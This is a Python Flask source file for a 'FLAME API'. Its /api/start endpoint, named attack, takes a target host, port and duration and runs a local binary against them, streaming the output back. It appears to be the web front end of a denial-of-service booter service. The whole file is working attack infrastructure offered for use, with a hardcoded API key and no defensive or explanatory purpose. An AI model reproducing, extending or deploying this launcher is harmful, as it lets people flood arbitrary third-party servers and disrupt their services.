from flask import Flask, request, Response
import subprocess
import os
import traceback

app = Flask(__name__)

BINARY_PATH = "/app/raj"  # Railway me binary ka path
API_KEY = "FLAME_0wp8pzavEQ7ZB0S6Y3J_Bcn5wxRwanC-xQehPgBWp8E"

@app.route('/api/start')
def attack():
    try:
        key = request.args.get('key')
        target = request.args.get('target')
        port = request.args.get('port')
        duration = request.args.get('time')

        if not key or not target or not port or not duration:
            return {"error": "Missing parameters"}, 400

        if key != API_KEY:
            return {"error": "Invalid API Key"}, 401

        if not os.path.exists(BINARY_PATH):
            return {"error": f"Binary missing at {BINARY_PATH}"}, 404

        os.chmod(BINARY_PATH, 0o755)

        cmd = [BINARY_PATH, target, str(port), str(duration)]

        def generate():
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                yield line
            process.wait()
            yield f"\n[Binary exited with code {process.returncode}]"
            if process.returncode != 0:
                yield "\n⚠️ Check binary compatibility (missing libs/segfault)"

        return Response(generate(), mimetype='text/plain')

    except Exception as e:
        traceback.print_exc()
        return {"error": str(e), "trace": traceback.format_exc()}, 500

@app.route('/')
def home():
    return {"status": "FLAME API", "binary": BINARY_PATH, "exists": os.path.exists(BINARY_PATH)}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
